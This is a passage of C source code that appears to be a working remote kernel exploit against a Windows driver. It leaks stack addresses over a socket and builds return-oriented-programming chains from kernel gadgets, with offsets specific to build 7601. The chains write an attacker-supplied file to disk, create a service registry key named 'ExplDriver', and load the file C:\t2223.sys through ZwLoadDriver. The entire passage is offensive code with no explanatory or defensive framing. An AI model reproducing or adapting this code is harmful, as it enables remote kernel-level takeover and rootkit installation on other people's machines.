    ropChain[ropIndex++] = addrOA;
    ropChain[ropIndex++] = addrIOsb;
    ropChain[ropIndex++] = NULL;
    ropChain[ropIndex++] = FILE_ATTRIBUTE_NORMAL;
    ropChain[ropIndex++] = FILE_SHARE_WRITE | FILE_SHARE_READ;
    ropChain[ropIndex++] = FILE_OVERWRITE_IF;
    ropChain[ropIndex++] = 0;
    ropChain[ropIndex++] = 0;
    ropChain[ropIndex++] = 0;

    // pop reg (for , [reg])
    ropChain[ropIndex++] = addrHandle;
    if (info->versionOS == 7601) ropChain[ropIndex++] = info->KernelBase + gad_movEaxMemEax7; // 0x41E88
    else ropChain[ropIndex++] = info->KernelBase + gad_movEaxMemEax; // 0x3C806
    for (; ropIndex < 0x11; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }

    // mov reg, [reg]
    if (info->versionOS == 7601) ropChain[ropIndex++] = info->KernelBase + gad_popEcx7; // 0x1BAF
    else ropChain[ropIndex++] = info->KernelBase + gad_popEcx; // 0x22E10
    if (info->versionOS == 7601) {
        for (; ropIndex < 0x13; ++ropIndex) {
            ropChain[ropIndex] = ropStub;
        }
    }
    else {
        for (; ropIndex < 0x12; ++ropIndex) {
            ropChain[ropIndex] = ropStub;
        }
    }
    
    // pop ecx
    if (info->versionOS == 7601) ropChain[ropIndex++] = addrStartRop + (0x1a * 4);
    else ropChain[ropIndex++] = addrStartRop + (0x19 * 4); // 19
    if (info->versionOS == 7601) ropChain[ropIndex++] = info->KernelBase + gad_movMemEcxEax7;
    else ropChain[ropIndex++] = info->KernelBase + gad_movMemEcxEax; // 0xED2E2
    for (; ropIndex < 0x14; ++ropIndex) { //0x13
        ropChain[ropIndex] = ropStub;
    }

    // mov [ecx], eax
    if (info->versionOS == 7601) ropChain[ropIndex++] = info->KernelBase + gad_popEcx7;
    else ropChain[ropIndex++] = info->KernelBase + gad_popEcx; // 0x22E10
    for (; ropIndex < 0x15; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }

    // pop ecx
    if (info->versionOS == 7601) ropChain[ropIndex++] = addrStartRop + (0x2e * 4);
    else ropChain[ropIndex++] = addrStartRop + (0x2d * 4);
    if (info->versionOS == 7601) ropChain[ropIndex++] = info->KernelBase + gad_movMemEcxEax7;
    else ropChain[ropIndex++] = info->KernelBase + gad_movMemEcxEax; // 0xED2E2
    for (; ropIndex < 0x17; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }

    // mov [ecx], eax
    ropChain[ropIndex++] = info->fun.ZwWriteFile;
    for (; ropIndex < 0x18; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }

    // frame ZwWriteFile
    ropChain[ropIndex++] = info->fun.ExFreePool;
    ropChain[ropIndex++] = 0x02020202;
    ropChain[ropIndex++] = NULL;
    ropChain[ropIndex++] = NULL;
    ropChain[ropIndex++] = NULL;
    ropChain[ropIndex++] = addrIOsb;
    ropChain[ropIndex++] = address;
    ropChain[ropIndex++] = size;
    ropChain[ropIndex++] = addrBytesOffset;
    ropChain[ropIndex++] = NULL;

    // frame ExFreePool
    ropChain[ropIndex++] = info->DriverBase + rva_CloseSocket;
    ropChain[ropIndex++] = address;

    // exit
    ropChain[ropIndex++] = leakSock;

    if (!MemoryROP(info,
        WRITE,
        addrStartRop,
        ropChain,
        (ropIndex * 4))) {

        free(ropChain);
        CloseSock(&tmpSock);
        return FALSE;
    }

    free(ropChain);

    Sleep(3000);
    // exec
    CloseSock(&tmpSock);

    Sleep(5000);
    ULONG counter = 0;
    IO_STATUS_BLOCK ioSB = { 0, };
    while ((ioSB.Information == 0 && ioSB.Status == 0) && counter < 10) {
        if (!MemoryROP(info,
            READ,
            addrIOsb,
            &ioSB,
            sizeof(IO_STATUS_BLOCK))) {

            return FALSE;
        }
        Sleep(5000);
        counter++;
    }

    if ((tmpSock = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) { return FALSE; }
    leakStack = 0;
    if (!TargetRead(tmpSock, -1, &leakStack)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    leakStack = leakStack - 0x408 - 4;
    printf("Close handle...\n");
    addrStartRop = leakStack - 0x4c;

    if (!MemoryROP(info,
        READ,
        leakStack + 0x490 + 8,
        &leakSock,
        4)) {

        CloseSock(&tmpSock);
        return FALSE;
    }

    // close handle rop
    {
        PULONG ropChain = (PULONG)malloc(64);
        ULONG ropIndex = 0, sizeRopWords = 0;
        ULONG handle;
        ULONG ropStub = 0x01010101;

        if (!MemoryROP(info,
            READ,
            addrHandle,
            &handle,
            4)) {

            CloseSock(&tmpSock);
            return FALSE;
        }

        ropChain[ropIndex++] = info->fun.ZwClose;
        ropChain[ropIndex++] = ropStub;
        ropChain[ropIndex++] = ropStub;

        // frame ZwClose
        ropChain[ropIndex++] = info->DriverBase + rva_CloseSocket;
        ropChain[ropIndex++] = handle;

        // exit
        ropChain[ropIndex++] = leakSock;

        if (!MemoryROP(info,
            WRITE,
            addrStartRop,
            ropChain,
            (ropIndex * 4))) {

            free(ropChain);
            CloseSock(&tmpSock);
            return FALSE;
        }

        free(ropChain);
    }

    Sleep(3000);
    CloseSock(&tmpSock);

    printf("Write bytes on disk: %d\n", ioSB.Information);

    if (ioSB.Information != size) {
        printf("Write Error Status: 0x%X08\n", ioSB.Status);
        return FALSE;
    }

    return TRUE;
}

BOOL ExecDriver(PDRIVER_INFO info, ULONG addrForSave) {

    SOCKET tmpSock = INVALID_SOCKET;
    ULONG leakStack, leakSock;
    BYTE RTL_REGISTRY_SERVICES = 1;


    printf("Create key and load driver...\n");

    if ((tmpSock = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) { return FALSE; }
    if (!TargetRead(tmpSock, -1, &leakStack)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    leakStack = leakStack - 0x408 - 4;
    ULONG addrStartRop = leakStack - 0x4c;
    ULONG addrStartSave = addrForSave;
    BYTE zero[64] = { 0, };

    if (!MemoryROP(info,
        READ,
        leakStack + 0x498,
        &leakSock,
        4)) {

        CloseSock(&tmpSock);
        return FALSE;
    }

    WCHAR drSubKey[] = L"ExplDriver";
    ULONG addrSubKey = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrSubKey,
        &drSubKey,
        sizeof(drSubKey))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(drSubKey);

    WCHAR imagePath[] = L"ImagePath";
    ULONG addrValueIP = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrValueIP,
        &imagePath,
        sizeof(imagePath))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(imagePath);

    WCHAR servIP[] = L"\\??\\C:\\t2223.sys";
    ULONG addrValueSIP = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrValueSIP,
        &servIP,
        sizeof(servIP))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(servIP);

    WCHAR type[] = L"Type";
    ULONG addrValueType = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrValueType,
        &type,
        sizeof(type))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(type);

    BYTE valueType = 1;
    ULONG addrType = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrType,
        &valueType,
        sizeof(valueType))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(valueType);

    WCHAR error[] = L"ErrorControl";
    ULONG addrValueEC = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrValueEC,
        &error,
        sizeof(error))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(error);

    BYTE valueEC = 1;
    ULONG addrEC = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrEC,
        &valueEC,
        sizeof(valueEC))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(valueEC);

    WCHAR start[] = L"Start";
    ULONG addrValueStart = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrValueStart,
        &start,
        sizeof(start))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(start);

    BYTE valueStart = 3;
    ULONG addrStart = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrStart,
        &valueStart,
        sizeof(valueStart))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(valueStart);

    WCHAR fullDrPath[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\ExplDriver";
    ULONG addrFullDrPath = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrFullDrPath,
        &fullDrPath,
        sizeof(fullDrPath))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(fullDrPath);

    UNICODE_STRING usDrFullPath;
    RtlInitUnicodeString(&usDrFullPath, fullDrPath);
    usDrFullPath.Buffer = (PWSTR)addrFullDrPath;
    ULONG addrUsDrFullPath = addrForSave;
    if (!MemoryROP(info,
        WRITE,
        addrUsDrFullPath,
        &usDrFullPath,
        sizeof(usDrFullPath))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addrForSave += sizeof(usDrFullPath);

    // роп для создания ключа реестра и запуска драйвера
    {
        PULONG ropChain = (PULONG)malloc(256);
        ULONG ropIndex = 0, sizeRopWords = 0;
        ULONG ropStub = 0x01010101;

        ropChain[ropIndex++] = info->fun.RtlCreateRegistryKey;
        ropChain[ropIndex++] = ropStub;
        ropChain[ropIndex++] = ropStub;

        // frame RtlCreateRegistryKey
        ropChain[ropIndex++] = info->fun.RtlWriteRegistryValue;
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;

        // ImagePath
        ropChain[ropIndex++] = info->fun.RtlWriteRegistryValue;
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueIP;
        ropChain[ropIndex++] = REG_EXPAND_SZ;
        ropChain[ropIndex++] = addrValueSIP;
        ropChain[ropIndex++] = sizeof(servIP);

        // Type
        ropChain[ropIndex++] = info->fun.RtlWriteRegistryValue;
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueType;
        ropChain[ropIndex++] = REG_DWORD;
        ropChain[ropIndex++] = addrType;
        ropChain[ropIndex++] = sizeof(valueType);

        // ErrorControl
        ropChain[ropIndex++] = info->fun.RtlWriteRegistryValue;
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueEC;
        ropChain[ropIndex++] = REG_DWORD;
        ropChain[ropIndex++] = addrEC;
        ropChain[ropIndex++] = sizeof(valueEC);

        // Start
        ropChain[ropIndex++] = info->fun.ZwLoadDriver;
        ropChain[ropIndex++] = RTL_REGISTRY_SERVICES;
        ropChain[ropIndex++] = addrSubKey;
        ropChain[ropIndex++] = addrValueStart;
        ropChain[ropIndex++] = REG_DWORD;
        ropChain[ropIndex++] = addrStart;
        ropChain[ropIndex++] = sizeof(valueStart);

        // frame ZwLoadDriver
        ropChain[ropIndex++] = info->DriverBase + rva_CloseSocket;
        ropChain[ropIndex++] = addrUsDrFullPath;

        // exit
        ropChain[ropIndex++] = leakSock;

        if (!MemoryROP(info,
            WRITE,
            addrStartRop,
            ropChain,
            (ropIndex * 4))) {

            CloseSock(&tmpSock);
            return FALSE;
        }
    }

    Sleep(3000);
    // exec
    CloseSock(&tmpSock);

    return TRUE;
}